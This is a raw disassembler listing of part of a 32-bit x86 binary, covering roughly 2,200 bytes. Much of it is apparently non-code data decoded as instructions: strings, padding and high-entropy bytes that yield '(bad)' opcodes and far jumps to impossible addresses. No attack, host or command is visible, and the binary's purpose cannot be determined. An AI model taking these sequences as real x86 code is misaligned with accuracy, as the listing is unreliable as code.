  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	ss inc ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf7
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    DWORD PTR [ebx+0x0],eax
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	shr    BYTE PTR [edx+ebp*2+0xd1dc9f],1
  413f07:	add    BYTE PTR [ecx+eax*1],al
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	pop    edi
  413f0d:	cmp    al,0x39
  413f0f:	loopne 0x413eac
  413f11:	push   ds
  413f12:	add    eax,edx
  413f14:	xchg   ebp,eax
  413f15:	mov    ebp,0xb3cc02cf
  413f1a:	repnz mov cl,0xda
  413f1d:	jge    0x413f9b
  413f1f:	fdivr  QWORD PTR [eax+0x3baad7c4]
  413f25:	fst    DWORD PTR [edx+0x163d3cbd]
  413f2b:	or     DWORD PTR [edi],esi
  413f2d:	mov    esi,0x116ec803
  413f32:	jle    0x413f9e
  413f34:	xlat   BYTE PTR ds:[ebx]
  413f35:	mov    edi,0x44e4c785
  413f3a:	mov    esp,0xe9c79081
  413f3f:	popa   
  413f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f41:	cmp    esi,DWORD PTR [edi+0x41]
  413f44:	std    
  413f45:	test   DWORD PTR [edx],edi
  413f47:	cdq    
  413f48:	cmp    BYTE PTR [ecx-0x1d],0xe4
  413f4c:	push   cs
  413f4d:	sbb    al,0xfe
  413f4f:	test   DWORD PTR [eax-0x3a],ebp
  413f52:	jo     0x413fc2
  413f54:	or     bl,al
  413f56:	cmp    al,0x4e
  413f58:	call   0x9ebdff53
  413f5d:	jne    0x413f77
  413f5f:	sub    ch,cl
  413f61:	dec    ebp
  413f62:	enter  0xfc1c,0xdd
  413f66:	jle    0x413fd1
  413f68:	mov    edx,0x4de1474a
  413f6d:	leave  
  413f6e:	push   ds
  413f6f:	dec    ebx
  413f70:	in     eax,dx
  413f71:	xor    esi,DWORD PTR [esi+0x6cb8cc3d]
  413f77:	or     esi,edi
  413f79:	adc    al,0x78
  413f7b:	xchg   ebx,eax
  413f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f7d:	jmp    0x6dae80bd
  413f82:	jmp    0xdc18:0x2bfd29e0
  413f89:	add    al,BYTE PTR [edx-0x14]
  413f8c:	xchg   edi,eax
  413f8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f8e:	enter  0xfb0c,0x81
  413f92:	stos   DWORD PTR es:[edi],eax
  413f93:	lea    esi,[ebx+0x68]
  413f96:	sbb    al,0x13
  413f99:	and    al,0x3c
  413f9b:	and    eax,0xfa18c5
  413fa0:	xor    DWORD PTR [edi+0x2b],esi
  413fa3:	xchg   edx,eax
  413fa4:	xchg   ebx,eax
  413fa5:	scas   al,BYTE PTR es:[edi]
  413fa6:	xchg   esi,eax
  413fa7:	aaa    
  413fa8:	sub    ecx,DWORD PTR [edx]
  413faa:	xor    al,BYTE PTR es:[edi-0x44]
  413fae:	and    eax,0x8d3817a2
  413fb3:	(bad)  
  413fb5:	ret    0x20c0
  413fb8:	dec    esp
  413fb9:	xor    ch,BYTE PTR [eax+0x790efcec]
  413fbf:	cmc    
  413fc0:	daa    
  413fc1:	ds stc 
  413fc3:	call   0xa355:0x47dbcbb0
  413fca:	stc    
  413fcb:	fnstcw WORD PTR [eax]
  413fcd:	pop    ebp
  413fce:	cmp    edi,DWORD PTR [ebx]
  413fd0:	jmp    0x413fd9
  413fd2:	xchg   esp,eax
  413fd3:	pavgb  mm3,QWORD PTR [eax+0x1ae03277]
  413fda:	mov    bl,0x98
  413fdc:	sbb    al,0x27
  413fde:	sbb    al,0xe4
  413fe0:	xlat   BYTE PTR ds:[ebx]
  413fe1:	sbb    al,0x8f
  413fe3:	inc    esi
  413fe4:	push   DWORD PTR [eax]
  413fe6:	in     al,0x82
  413fe8:	push   0x77
  413fea:	add    ah,dh
  413fec:	mov    al,ds:0x312ae51e
  413ff1:	pop    ss
  413ff2:	adc    edi,DWORD PTR [edx-0x54]
  413ff5:	cwde   
  413ff6:	adc    eax,0x6cb17367
  413ffb:	rol    DWORD PTR [eax+0xc],1
  413ffe:	adc    DWORD PTR [eax+0x8d60acf],ebp
  414004:	(bad)  
  414005:	jmp    0xacfc:0x33002161
  41400c:	sub    BYTE PTR [edx+0x4633],ah
	...
  414072:	add    BYTE PTR [eax],al
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x664a:0x3ed52e96
  414083:	daa    
  414084:	loopne 0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    al,0x1
  41408a:	add    BYTE PTR [eax],al
  41408c:	mov    eax,0xbbabaa4a
  414091:	ins    BYTE PTR es:[edi],dx
  414092:	in     al,dx
  414093:	cmp    DWORD PTR [ebx-0x64],ebx
  414096:	int    0x9a
  414098:	mov    al,ds:0xd0406379
  41409d:	sar    BYTE PTR [esi-0x1c],1
  4140a0:	sub    eax,0xc79e180c
  4140a5:	cmp    ah,BYTE PTR [eax+0x4c3f3ffd]
  4140ab:	fistp  WORD PTR [ebp+esi*8-0x22f89402]
  4140b2:	jno    0x414040
  4140b4:	jb     0x4140ce
  4140b6:	in     eax,dx
  4140b7:	sub    ebx,ecx
  4140b9:	dec    esp
  4140ba:	pop    ebp
  4140bb:	jno    0x4140c8
  4140bd:	call   DWORD PTR [ebp-0x53]
  4140c0:	dec    ebx
  4140c1:	enter  0x3c97,0xff
  4140c5:	call   0xa4af:0x58c418ae
  4140cc:	(bad)  
  4140cd:	dec    eax
  4140ce:	fldcw  WORD PTR [ebx+0x3648290]
  4140d4:	out    0xcc,al
  4140d6:	es adc eax,0x403327c9
  4140dc:	stos   DWORD PTR es:[edi],eax
  4140dd:	into   
  4140de:	xchg   ecx,eax
  4140df:	jge    0x4140f0
  4140e1:	adc    BYTE PTR [ebx+0x6cd6e3ab],cl
  4140e7:	xchg   ecx,ebp
  4140e9:	mul    BYTE PTR [eax]
  4140eb:	jmp    0x41408a
  4140ed:	cld    
  4140ee:	sbb    BYTE PTR [esi],al
  4140f0:	cwde   
  4140f1:	mov    eax,ds:0x21894095
  4140f6:	sbb    ch,bh
  4140f8:	cmp    dl,bh
  4140fa:	stos   DWORD PTR es:[edi],eax
  4140fb:	leave  
  4140fc:	push   ebp
  4140fd:	lahf   
  4140fe:	push   eax
  4140ff:	cwde   
  414100:	in     eax,dx
  414101:	xor    al,0x6a
  414103:	add    DWORD PTR [edx-0xc],ebp
  414106:	xor    al,0x66
  414108:	or     BYTE PTR [edi-0x40],dh
  41410b:	lods   al,BYTE PTR ds:[esi]
  41410c:	in     eax,dx
  41410d:	or     ecx,eax
  41410f:	aad    0xad
  414111:	mov    ah,0xd2
  414113:	xlat   BYTE PTR ds:[ebx]
  414114:	test   DWORD PTR [ecx-0x1460447],esp
  41411a:	data16 mov bl,0xc5
  41411d:	inc    eax
  41411e:	lea    ecx,[ecx+0x4d]
  414121:	inc    ecx
  414122:	es mov ah,0xda
  414125:	pop    edi
  414126:	adc    al,0xcf
  414128:	hlt    
  414129:	inc    ecx
  41412a:	shl    BYTE PTR [ebx+0x7b],cl
  41412d:	cmp    esi,DWORD PTR gs:[edx+0x7827f159]
  414134:	(bad)  
  414135:	cld    
  414136:	call   0x1fca10e9
  41413b:	in     al,0x32
  41413d:	es popf 
  41413f:	jge    0x4141be
  414141:	xor    bl,dh
  414143:	shl    DWORD PTR [ebx+0x42425a29],cl
  414149:	pop    ds
  41414a:	sbb    eax,esp
  41414c:	mov    ecx,0x7fcc4f2
  414151:	dec    esi
  414152:	dec    ebx
  414153:	jp     0x4141bd
  414155:	jno    0x41415e
  414157:	mov    ecx,0x2f80d2d
  41415c:	xor    DWORD PTR [eax+0x1],edx
  41415f:	or     al,0x9b
  414161:	call   0x749a:0x199b4393
  414168:	data16 jmp 0x4141ab
  41416b:	out    0xc5,al
  41416d:	fiadd  WORD PTR [esi+0x530c5072]
  414173:	add    al,0x7a
  414175:	cs (bad) 
  414178:	fchs   
  41417a:	xor    eax,0xe5ed0140
  41417f:	imul   BYTE PTR [ecx+eax*2-0x3a]
  414183:	mov    BYTE PTR [esp+ecx*4+0x11],bh
  414187:	ins    DWORD PTR es:[edi],dx
  414188:	or     DWORD PTR [ebx],edi
  41418a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41418b:	mov    ds:0x68537445,al
	...
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	adc    esi,ecx
  414202:	mov    ebx,0xd3e40a
  414207:	add    BYTE PTR [ecx+eax*1],al
  41420a:	add    BYTE PTR [eax],al
  41420c:	pop    esi
  41420d:	mov    al,0x26
  41420f:	cmp    BYTE PTR [eax],al
  414211:	pop    eax
  414212:	cmp    dl,BYTE PTR [eax+0x19]
  414215:	pushf  
  414216:	jp     0x4141a9
  414218:	push   edi
  414219:	mov    ebp,0x3c4760ba
  41421e:	add    eax,0x474e3641
  414223:	ss sbb eax,0x27809924
  414229:	mov    dl,0x41
  41422b:	xor    BYTE PTR [ebp-0x6e],cl
  41422e:	dec    edi
  41422f:	ss int 0xa2
  414232:	pop    ebp
  414233:	or     DWORD PTR [edx-0x62],0x67
  414237:	inc    esi
  414238:	imul   ecx,DWORD PTR ds:0x808d0f74,0xffffffb0
  41423f:	push   0x6199dac1
  414244:	(bad)  
  414245:	fwait
  414246:	cmp    dl,al
  414248:	xchg   ecx,eax
  414249:	xlat   BYTE PTR ds:[ebx]
  41424a:	lods   al,BYTE PTR ds:[esi]
  41424b:	outs   dx,BYTE PTR ds:[esi]
  41424c:	and    DWORD PTR [esi+0x33],0xffffffec
  414250:	shl    DWORD PTR [esi-0x73],cl
  414253:	lock (bad) 
  414255:	mov    ah,0xe5
  414257:	push   esi
  414258:	push   esi
  414259:	pop    ss
  41425a:	cmp    al,0xdf
  41425c:	push   eax
  41425d:	scas   eax,DWORD PTR es:[edi]
  41425e:	jo     0x4141fd
  414260:	cmps   BYTE PTR es:[si],BYTE PTR es:[di]
  414263:	adc    eax,0x90057561
  414268:	in     eax,0x6d
  41426a:	aam    0xf5
  41426c:	loop   0x414231
  41426e:	adc    ah,bl
  414270:	lds    ebx,FWORD PTR [eax+ebp*2-0x6c]
  414274:	push   ebp
  414275:	push   ss
  414276:	cmp    DWORD PTR [esi-0x274dd4bf],eax
  41427c:	or     bh,al
  41427e:	adc    dl,0xde
  414281:	out    0x99,eax
  414283:	std    
  414284:	cmp    al,0xb3
  414286:	push   edi
  414287:	mov    edi,0x872f1d0b
  41428c:	out    dx,al
  41428d:	xchg   ebp,eax
  41428e:	add    bh,BYTE PTR [ecx-0x5c]
  414291:	inc    ebp
  414292:	sub    DWORD PTR [esi],esp
  414294:	in     al,0x6d
  414296:	in     al,0x74
  414298:	sar    BYTE PTR [edx],cl
  41429a:	mov    bh,0xb4
  41429c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41429d:	push   ss
  41429e:	mov    cl,0xfd
  4142a0:	pop    edx
  4142a1:	test   BYTE PTR [ebx+eiz*1-0x11d8831a],dh
  4142a8:	cmp    DWORD PTR [ecx+0x31],ebx
  4142ab:	mov    dl,0x99
  4142ad:	stos   DWORD PTR es:[edi],eax
  4142ae:	aam    0x8c
  4142b0:	xchg   BYTE PTR [edi-0x6530655],cl
  4142b6:	scas   al,BYTE PTR es:[edi]
  4142b7:	jns    0x4142e5
  4142b9:	ror    cl,cl
  4142bb:	or     ecx,DWORD PTR [ecx+0x6]
  4142be:	enter  0x917c,0xa4
  4142c2:	icebp  
  4142c3:	mov    DWORD PTR [eax-0x63],edi
  4142c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142c7:	int    0x60
  4142c9:	or     al,0x36
  4142cb:	fist   DWORD PTR [edi-0x7ab49712]
  4142d1:	test   DWORD PTR [ecx+0x6b],ebx
  4142d4:	add    edi,DWORD PTR ds:0x7ac7361c
  4142da:	and    al,0x16
  4142dc:	xchg   BYTE PTR [eax+0x4edf669c],bl
  4142e2:	stc    
  4142e3:	aaa    
  4142e4:	mov    ebp,0x83ab2dbb
  4142e9:	sbb    bh,BYTE PTR [ebx]
  4142eb:	push   0xffffffcc
  4142ed:	dec    eax
  4142ee:	inc    ecx
  4142ef:	pop    edi
  4142f0:	mov    al,ds:0x32d40824
  4142f5:	rcr    BYTE PTR [ebx+ecx*4-0x1b],1
  4142f9:	test   DWORD PTR [bx+di-0x4d],edi
  4142fd:	(bad)  
  4142fe:	jmp    0x414298
  414300:	mov    edx,edi
  414302:	inc    edx
  414303:	mov    DWORD PTR ds:0x6638cf29,0xcdbd5c34
  41430d:	retf   
  41430e:	inc    edi
  41430f:	cwde   
	...
  414374:	add    DWORD PTR [ecx-0x2122293],eax
  41437a:	mov    cl,0xdd
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	push   edi
  414381:	dec    esi
  414382:	test   al,0xbf
  414384:	call   0x441445d
  414389:	add    DWORD PTR [eax],eax
  41438b:	add    BYTE PTR [ebx-0x5392a5d9],dl
  414391:	hlt    
  414392:	xchg   DWORD PTR [esi+0x70ef56cf],ebx
  414398:	or     eax,0xed51897a
  41439d:	xor    ebx,DWORD PTR [ebx]
  41439f:	cmp    BYTE PTR [ebx-0x7d],ch
  4143a2:	inc    ecx
  4143a3:	sahf   
  4143a4:	or     eax,0x1d20ca7a
  4143a9:	cs ret 0x8aa7
  4143ad:	nop
  4143ae:	add    eax,0xfc163413
  4143b3:	pop    ebx
  4143b4:	test   BYTE PTR [edi+ecx*4],dl
  4143b7:	or     DWORD PTR [ebx-0x5184d0bc],edx
  4143bd:	retf   
  4143be:	rol    DWORD PTR [edx+0x25],1
  4143c1:	or     al,0x82
  4143c3:	xchg   DWORD PTR [ebp+0x6],ecx
  4143c6:	push   esi
  4143c7:	call   0x889b3e13
  4143cc:	es pop esi
  4143ce:	call   0x84d2:0xa234daf2
  4143d5:	cmp    ebx,DWORD PTR [eax-0x548222a2]
  4143db:	clc    
  4143dc:	or     al,0xc1
  4143de:	shr    edx,1
  4143e0:	dec    eax
  4143e1:	xchg   BYTE PTR [edi],cl
  4143e3:	fisttp QWORD PTR [eax-0x4c]
  4143e6:	mov    esi,DWORD PTR [esi-0x3d]
  4143e9:	push   cs
  4143ea:	das    
  4143eb:	repnz leave 
  4143ed:	mov    WORD PTR [ebp+eiz*8-0x36],ss
  4143f1:	test   al,0xef
  4143f3:	xchg   ebx,eax
  4143f4:	or     ch,cl
  4143f6:	dec    esi
  4143f7:	lds    esp,FWORD PTR [ecx]
  4143f9:	pop    ecx
  4143fa:	arpl   WORD PTR [edi+0x25f5fd21],si
  414400:	push   ebp
  414401:	das    
  414402:	(bad)  
  414403:	fsub   QWORD PTR [edi+0x12456a1c]
  414409:	(bad)  [ecx+0x69]
  41440c:	scas   eax,DWORD PTR es:[edi]
  41440d:	ror    BYTE PTR [esi+0x77],cl
  414410:	in     al,0x5a
  414412:	jb     0x4143f9
  414414:	lods   al,BYTE PTR ds:[esi]
  414415:	stos   BYTE PTR es:[edi],al
  414416:	xchg   esp,eax
  414417:	call   0xf2e3:0x66a17789
  41441e:	lods   al,BYTE PTR ds:[esi]
  41441f:	int3   
  414420:	fstp   DWORD PTR [ebp+ebp*8-0x59]
  414424:	pop    ecx
  414425:	push   ds
  414426:	pop    ds
  414427:	test   eax,0xbfef187c
  41442c:	sbb    al,0xff
  41442e:	pop    ss
  41442f:	in     al,0x21
  414431:	push   esi
  414432:	cld    
  414433:	or     DWORD PTR [ebx+eax*2-0x3dd4cebb],esi
  41443a:	jno    0x414415
  41443c:	loopne 0x41443f
  41443e:	mov    ah,0xf1
  414440:	mov    bh,0x4c
  414442:	inc    esp
  414443:	or     al,0x88
  414445:	mov    dh,BYTE PTR [ecx-0x49]
  414448:	ror    BYTE PTR [eax-0x1],1
  41444b:	(bad)  
